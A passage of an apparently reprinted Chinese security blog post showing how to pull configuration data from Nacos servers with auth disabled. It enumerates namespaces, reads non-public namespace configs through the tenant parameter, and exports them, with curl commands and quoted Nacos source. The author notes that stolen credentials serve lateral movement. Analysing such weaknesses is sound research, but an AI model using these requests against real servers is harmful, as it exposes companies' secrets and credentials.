+
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>但这里有个问题，这只能获取默认命名空间<code>public</code>里面的数据，但是现在有大聪明已经学会了不把数据放到默认的<code>public</code>，而是自己重新建一个<code>namespace</code>，再把企业的相关配置放在里面，这里留个伏笔，我们接着往下看。</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/4.png" alt="image"></p>
+</blockquote>
+<h3><span id="获取其他namespace的配置数据">获取其他Namespace的配置数据</span></h3><blockquote>
+<p>根据官方的OpenAPI文档描述，可以直接请求获取。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/console/namespaces&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们查看对应的代码，处理<code>namespace</code>的代码在<code>nacos/console/src/main/java/com/alibaba/nacos/console/controller/NamespaceController.java</code>这里，我们看从48行开始的代码，相关代码如下：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/v1/console/namespaces&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NamespaceController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CommonPersistService commonPersistService;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> NamespaceOperationService namespaceOperationService;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">namespaceIdCheckPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[\\w-]+&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NAMESPACE_ID_MAX_LENGTH</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get namespace list.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> namespace list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> RestResult&lt;List&lt;Namespace&gt;&gt; <span class="title function_">getNamespaces</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RestResultUtils.success(namespaceOperationService.getNamespaceList());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这样一看上去，直接访问就能获取到<code>Namespace</code>列表，我们再跟一下<code>namespaceOperationService.getNamespaceList()</code>:</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Namespace&gt; <span class="title function_">getNamespaceList</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// TODO 获取用kp</span></span><br><span class="line">        List&lt;TenantInfo&gt; tenantInfos = commonPersistService.findTenantByKp(DEFAULT_KP);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Namespace</span> <span class="variable">namespace0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Namespace</span>(<span class="string">&quot;&quot;</span>, DEFAULT_NAMESPACE, DEFAULT_QUOTA,</span><br><span class="line">                configInfoPersistService.configInfoCount(DEFAULT_TENANT), NamespaceTypeEnum.GLOBAL.getType());</span><br><span class="line">        List&lt;Namespace&gt; namespaceList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        namespaceList.add(namespace0);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (TenantInfo tenantInfo : tenantInfos) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">configCount</span> <span class="operator">=</span> configInfoPersistService.configInfoCount(tenantInfo.getTenantId());</span><br><span class="line">            <span class="type">Namespace</span> <span class="variable">namespaceTmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Namespace</span>(tenantInfo.getTenantId(), tenantInfo.getTenantName(),</span><br><span class="line">                    tenantInfo.getTenantDesc(), DEFAULT_QUOTA, configCount, NamespaceTypeEnum.CUSTOM.getType());</span><br><span class="line">            namespaceList.add(namespaceTmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> namespaceList;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>看上去也没有做什么限制，我们直接访问发现可以直接读到非public的Namespace，就是上面我们创建名叫REDTEAM的test_namespace命名空间。</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/5.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>这时候我们已经拿到了namespace、namespaceShowNmae，我们就可以根据之前的API光明正大的进行读取操作了，这里有个小技巧，之前读取配置里面的tenant参数获取的就是namespce，我们直接把tenant&#x3D;test_namespace加进去构造请求，轻松读取到非public空间的数据。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99&amp;tenant=test_namespace&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/6.png" alt="image"></p>
+</blockquote>
+<h3><span id="配置文件导出">配置文件导出</span></h3><blockquote>
+<p>就在我看上面上面这部分代码的时候，我们无意中发现了一个下载文件的接口，还是这个文件，找到了疑似导出配置文件的接口，我们继续跟进一下。<br><code>/config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigController.java</code></p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/7.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>接着我们在482行看到了相关代码。</p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/8.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>根据逻辑，我们很轻松的构造出下载的链接，跟上面的类似，其中tenant为空默认下载public命名空间，如果要下载其他命名空间的配置文件则重复之前的先获取Namespace即可。</p>
+</blockquote>
+<blockquote>
+<p><code>http://192.168.20.144:8848/nacos/v1/cs/configs?export=true&amp;tenant=test_namespace&amp;group=&amp;appName=&amp;ids=</code></p>
+</blockquote>
+<h2><span id="后记">后记</span></h2><blockquote>
+<p>现在来看，之所以因为官方觉得不开启auth不算是漏洞，是因为根据官网OpenAPI来看，你需要知道具体的 Data Id 以及 Group才能读到具体配置，但是攻击者总能够通过代码审计的方法找到其他参数进行绕过。<br>目前攻防对抗实战中，Nacos的环境遇到非常多，并且无一例外都没有开启auth，很多防守方甚至只是用防火墙阻断网上公开的那几条exp利用的关键地址，Nacos里面保存了企业很多的配置文件比如数据库连接信息、AK&#x2F;SK信息等等，拿到账号密码等信息之后用来做密码本，然后再进行内网横向，杀伤力非常之大。</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://nacos.io/en-us/docs/auth.html">https://nacos.io/en-us/docs/auth.html</a><br><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/1105">https://github.com/alibaba/nacos/issues/1105</a></p>
+</blockquote>
+
+        </div>
+        <div class="article-tags tags">
+            
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nacos/" rel="tag">Nacos</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            
+        </div>
+    </section>
+</article>
+
+
+
+
+
+        <script>setLoadingBarProgress(60);</script>
+    </main>
+
+    <footer id="footer" class="clearfix">
+
+    
+
+    <div class="social-wrapper">
+        
+            
+                <a href="https://github.com/artchen" class="social github"
+                   target="_blank" rel="external">
+                    <span class="icon icon-github"></span>
+                </a>
+            
+                <a href="/atom.xml" class="social rss"
+                   target="_blank" rel="external">
+                    <span class="icon icon-rss"></span>
+                </a>
+            
+        
+    </div>
+
+    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
+                                                                                    target="_blank">Art Chen</a>.
+    </div>
+    <div>&copy; <a href="/">氕氘氚</a></div>
+
+</footer>
+
+
+    <script>setLoadingBarProgress(80);</script>
+    <div class="overlay"></div>
+</div>
+
+<div class="site-sidebar" id="site-sidebar">
+
+    
+
+    <div class="sidebar-switch clearfix "
+         style="display: none">
+        <a class="dark-btn active" data-toggle="toc">
+            <span class="icon icon-list"></span>
+            <span class="text">Index</span>
+        </a>
+        <a class="dark-btn" data-toggle="bio">
+            <span class="icon icon-person"></span>
+            <span class="text">Bio</span>
+        </a>
+    </div>
+
+    <div class="site-toc "
+         style="display: none">
+        
+            <div class="no-index">No Index</div>
+        
+    </div>
+
+    <div class="site-bio show"
+         style="display: block">
+
+        <div class="about-me clearfix">
+            <div class="avatar">
+                <img src="/img/avatar.png"/>
+            </div>
+            <div class="info">
+                <a class="name dark-btn" href="/about">
+                    Szczecin
+                </a>
+            </div>
+            <div class="info">
+                <span class="item desc">
+                    Open your eyes to see the light in life
+                </span>
+            </div>
+        </div>
+
+        <div class="menu section">
+            <ul class="clearfix">
+                
+                    <li class="left">
+                        <a href="/about"
+                           onfocus="this.blur();"
+                           class="nav-about dark-btn block">
+                            简介
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/archives"
+                           onfocus="this.blur();"
+                           class="nav-archives dark-btn block">
+                            归档
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/categories"
+                           onfocus="this.blur();"
+                           class="nav-categories dark-btn block">
+                            分类
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/tags"
+                           onfocus="this.blur();"
+                           class="nav-tags dark-btn block">
+                            TAGs
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/WriteUP"
+                           onfocus="this.blur();"
+                           class="nav-WriteUP dark-btn block">
+                            WriteUP
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/EXP"
+                           onfocus="this.blur();"
+                           class="nav-EXP dark-btn block">
+                            EXP
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/SRC"
+                           onfocus="this.blur();"
+                           class="nav-SRC dark-btn block">
+                            SRC
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/Life"
+                           onfocus="this.blur();"
+                           class="nav-Life dark-btn block">
+                            Life
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+
+    </div>
+
+    <div class="shortcuts">
+        <a href="#header" class="top window-nav dark-btn" id="go-top">
+            <span class="icon icon-chevron-thin-up"></span>
+        </a>
+        <a class="close dark-btn" id="sidebar-close">
+            <span class="icon icon-close"></span>
+        </a>
+        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+            <span class="icon icon-chevron-thin-down"></span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>
+
+
+<script src="/js/jquery.fitvids.js"></script>
+
+<script>
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var SEARCH_SERVICE = "";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="/js/app.js"></script>
+
+
+<script src="/js/search.js"></script>
+
+
+
+
+
+<script>setLoadingBarProgress(100);</script>
+
+</body>
+</html>
